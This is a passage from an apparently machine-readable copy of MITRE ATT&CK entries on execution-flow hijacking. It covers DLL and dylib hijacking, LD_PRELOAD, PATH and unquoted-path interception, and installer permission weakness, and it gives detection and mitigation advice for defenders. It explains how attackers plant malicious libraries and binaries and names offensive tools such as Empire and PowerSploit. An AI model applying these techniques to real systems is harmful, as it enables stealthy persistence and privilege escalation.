href=\"https://www.crowdstrike.com/en-us/blog/4-ways-adversaries-hijack-dlls/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hijack DLLs CrowdStrike)</a>\n\n### DLL Substitution\nAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file. <a href=\"https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wietze Beukema DLL Hijacking)</a>\n\nPrograms that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.\n\nRemote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL. <a href=\"https://owasp.org/www-community/attacks/Binary_planting\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dll pre load owasp)</a> <a href=\"https://learn.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: microsoft remote preloading)</a>\n\nIf a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.","detection":"Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of <code>.manifest</code> and <code>.local</code> redirection files that do not correlate with software updates are suspicious.","platforms":["Windows"],"dataSources":["File: File Modification","Module: Module Load","File: File Creation"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"When possible, include hash values in manifest files to help prevent side-loading of malicious libraries."},{"id":"M1038","name":"Execution Prevention","description":"Identify and block potentially malicious software executed through DLL hijacking by using application control solutions capable of blocking DLLs loaded by legitimate software. <a href=\"https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/dll-rules-in-applocker\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AppLocker DLL)</a>"},{"id":"M1044","name":"Restrict Library Loading","description":"Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+. <a href=\"https://msrc-blog.microsoft.com/2010/08/23/more-information-about-the-dll-preloading-remote-attack-vector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft More information about DLL)</a>\n\nEnable Safe DLL Search Mode to move the user's current folder later in the search order. This is included by default in modern versions of Windows; the associated Windows Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode</code>. <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic Link Library Search Order)</a>"},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting DLL search order hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for DLL hijacking weaknesses. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>\n\nUse the program <code>sxstrace.exe</code> that is included with Windows, along with manual inspection, to check manifest files for side-by-side problems in software. <a href=\"https://docs.microsoft.com/windows-server/administration/windows-commands/sxstrace\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Sxstrace)</a>"},{"id":"M1051","name":"Update Software","description":"Update software regularly to include patches that fix DLL side-loading vulnerabilities."}]},{"id":"T1574.004","name":"Dylib Hijacking","description":"Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path. <a href=\"https://objective-see.com/blog/blog_0x46.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wardle Dylib Hijack Vulnerable Apps)</a> <a href=\"https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wardle Dylib Hijacking OSX 2015)</a> <a href=\"https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/situational_awareness/host/osx/HijackScanner.py\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github EmpireProject HijackScanner)</a> <a href=\"https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/persistence/osx/CreateHijacker.py\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github EmpireProject CreateHijacker Dylib)</a> Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process. <a href=\"https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Writing Bad Malware for OSX)</a> <a href=\"https://taomm.org/vol1/pdfs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: wardle artofmalware volume1)</a> <a href=\"https://malwareunicorn.org/workshops/macos_dylib_injection.html#5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareUnicorn macOS Dylib Injection MachO)</a>","detection":"Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. \n\nRun path dependent libraries can include <code>LC_LOAD_DYLIB</code>, <code>LC_LOAD_WEAK_DYLIB</code>, and <code>LC_RPATH</code>. Other special keywords are recognized by the macOS loader are <code>@rpath</code>, <code>@loader_path</code>, and <code>@executable_path</code>. <a href=\"https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/RunpathDependentLibraries.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Developer Doco Archive Run-Path)</a> These loader instructions can be examined for individual binaries or frameworks using the <code>otool -l</code> command. Objective-See's Dylib Hijacking Scanner can be used to identify applications vulnerable to dylib hijacking. <a href=\"https://objective-see.com/blog/blog_0x46.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wardle Dylib Hijack Vulnerable Apps)</a> <a href=\"https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/situational_awareness/host/osx/HijackScanner.py\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github EmpireProject HijackScanner)</a>","platforms":["macOS"],"dataSources":["Module: Module Load","File: File Creation","File: File Modification"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Set directory access controls to prevent file writes to the search paths for applications, both in the folders where applications are run from and the standard dylib folders."}]},{"id":"T1574.005","name":"Executable Installer File Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL search order hijacking.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors. <a href=\"https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mozilla_sec_adv_2012)</a> <a href=\"https://seclists.org/fulldisclosure/2015/Dec/34\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Executable Installers are Vulnerable)</a> If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.","detection":"Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.","platforms":["Windows"],"dataSources":["Service: Service Metadata","File: File Modification","File: File Creation","Process: Process Creation","Module: Module Load"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able."},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting file system permissions abuse opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for service file system permissions weaknesses. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>"},{"id":"M1052","name":"User Account Control","description":"Turn off UAC's privilege elevation for standard users <code>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]</code> to automatically deny elevation requests, add: <code>\"ConsentPromptBehaviorUser\"=dword:00000000</code>. Consider enabling installer detection for all users by adding: <code>\"EnableInstallerDetection\"=dword:00000001</code>. This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: <code>\"EnableInstallerDetection\"=dword:00000000</code>. This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged. <a href=\"https://seclists.org/fulldisclosure/2015/Dec/34\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Executable Installers are Vulnerable)</a>"}]},{"id":"T1574.006","name":"Dynamic Linker Hijacking","description":"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. <a href=\"https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)</a> <a href=\"https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Timac DYLD_INSERT_LIBRARIES)</a> <a href=\"https://jon-gabilondo-angulo-7635.medium.com/how-to-inject-code-into-mach-o-apps-part-ii-ddb13ebc8191\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass)</a> Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. <a href=\"https://www.man7.org/linux/man-pages/man8/ld.so.8.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Man LD.SO)</a> <a href=\"https://www.tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TLDP Shared Libraries)</a> <a href=\"https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Doco Archive Dynamic Libraries)</a> Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library. <a href=\"https://www.baeldung.com/linux/ld_preload-trick-what-is\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Baeldung LD_PRELOAD)</a>\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used <code>LD_PRELOAD</code> to inject a malicious library into every descendant process of the <code>sshd</code> daemon, resulting in execution under a legitimate process. When the executing sub-process calls the <code>execve</code> function, for example, the malicious library’s <code>execve</code> function is executed rather than the system function <code>execve</code> contained in the system library on disk. This allows adversaries to Hide Artifacts from detection, as hooking system functions such as <code>execve</code> and <code>readdir</code> enables malware to scrub its own artifacts from the results of commands such as <code>ls</code>, <code>ldd</code>, <code>iptables</code>, and <code>dmesg</code>. <a href=\"https://www.welivesecurity.com/2017/10/30/windigo-ebury-update-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Ebury Oct 2017)</a> <a href=\"https://intezer.com/blog/research/new-linux-threat-symbiote/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer Symbiote 2022)</a> <a href=\"https://www.elastic.co/security-labs/declawing-pumakit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Security Labs Pumakit 2024)</a>\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.","detection":"Monitor for changes to environment variables and files associated with loading shared libraries such as <code>LD_PRELOAD</code> and <code>DYLD_INSERT_LIBRARIES</code>, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.","platforms":["Linux","macOS"],"dataSources":["File: File Creation","Command: Command Execution","Module: Module Load","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"When System Integrity Protection (SIP) is enabled in macOS, the aforementioned environment variables are ignored when executing protected binaries. Third-party applications can also leverage Apple’s Hardened Runtime, ensuring these environment variables are subject to imposed restrictions. <a href=\"https://developer.apple.com/documentation/security/hardened_runtime\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Developer Doco Hardened Runtime)</a> Admins can add restrictions to applications by setting the setuid and/or setgid bits, use entitlements, or have a __RESTRICT segment in the Mach-O binary."},{"id":"M1038","name":"Execution Prevention","description":"Adversaries may use new payloads to execute this technique. Identify and block potentially malicious software executed through hijacking by using application control solutions also capable of blocking libraries loaded by legitimate software."}]},{"id":"T1574.007","name":"Path Interception by PATH Environment Variable","description":"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in <code>C:\\example path</code>, which by default precedes <code>C:\\Windows\\system32\\net.exe</code> in the PATH environment variable, when \"net\" is executed from the command-line the <code>C:\\example path</code> will be called instead of the system's legitimate executable at <code>C:\\Windows\\system32\\net.exe</code>. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a Command and Scripting Interpreter. <a href=\"https://www.expressvpn.com/blog/cybersecurity-lessons-a-path-vulnerability-in-windows/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ExpressVPN PATH env Windows 2021)</a>\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the <code>$PATH</code> variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, Unix Shell Configuration Modification, or modifying the <code>/etc/paths.d</code> folder contents. <a href=\"https://www.uptycs.com/blog/new-poc-exploit-backdoor-malware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: uptycs Fake POC linux malware 2023)</a> <a href=\"https://www.cyberciti.biz/faq/appleosx-bash-unix-change-set-path-environment-variable/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: nixCraft macOS PATH variables)</a> <a href=\"https://www.elastic.co/guide/en/security/7.17/prebuilt-rule-7-16-4-modification-of-environment-variable-via-launchctl.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Rules macOS launchctl 2022)</a>","detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Creation","Windows Registry: Windows Registry Key Modification","Process: Process Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution. Require that all executables be placed in write-protected directories."},{"id":"M1038","name":"Execution Prevention","description":"Adversaries will likely need to place new binaries in locations to be executed through this weakness. Identify and block potentially malicious software executed path interception by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate. <a href=\"https://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Application Whitelisting)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a> <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/technet-magazine/cc510322(v=msdn.10)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Application Lockdown)</a> (Citation: Microsoft Using Software Restriction )"},{"id":"M1047","name":"Audit","description":"Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CreateProcess)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic-Link Library Security)</a> <a href=\"https://skanthak.homepage.t-online.de/sentinel.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Vulnerability and Exploit Detector)</a>"}]},{"id":"T1574.008","name":"Path Interception by Search Order Hijacking","description":"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL search order hijacking, the search order differs depending on the method that is used to execute the program. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CreateProcess)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows NT Command Shell)</a> <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WinExec)</a> However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. <a href=\"https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Environment Property)</a>\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in DLL.","detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows"],"dataSources":["Process: Process Creation","File: File Modification","File: File Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution. Require that all executables be placed in write-protected directories."},{"id":"M1038","name":"Execution Prevention","description":"Adversaries will likely need to place new binaries in locations to be executed through this weakness. Identify and block potentially malicious software executed path interception by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate. <a href=\"https://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Application Whitelisting)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a> <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/technet-magazine/cc510322(v=msdn.10)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Application Lockdown)</a> (Citation: Microsoft Using Software Restriction )"},{"id":"M1047","name":"Audit","description":"Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CreateProcess)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic-Link Library Security)</a> <a href=\"https://skanthak.homepage.t-online.de/sentinel.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Vulnerability and Exploit Detector)</a>"}]},{"id":"T1574.009","name":"Path Interception by Unquoted Path","description":"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CurrentControlSet Services)</a> and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). <a href=\"https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Help eliminate unquoted path)</a> (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. <a href=\"https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Unquoted Services)</a> <a href=\"https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Privilege Escalation Guide)</a>\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.","detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows"],"dataSources":["File: File Modification","File: File Creation","Process: Process Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution. Require that all executables be placed in write-protected directories."},{"id":"M1038","name":"Execution Prevention","description":"Adversaries will likely need to place new binaries in locations to be executed through this weakness. Identify and block potentially malicious software executed path interception by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate. <a href=\"https://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Application Whitelisting)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a> <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/technet-magazine/cc510322(v=msdn.10)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Application Lockdown)</a> (Citation: Microsoft Using Software Restriction )"},{"id":"M1047","name":"Audit","description":"Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CreateProcess)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic-Link Library Security)</a> <a href=\"https://skanthak.homepage.t-online.de/sentinel.html\" target=\"_blank\" rel=\"noopener\" 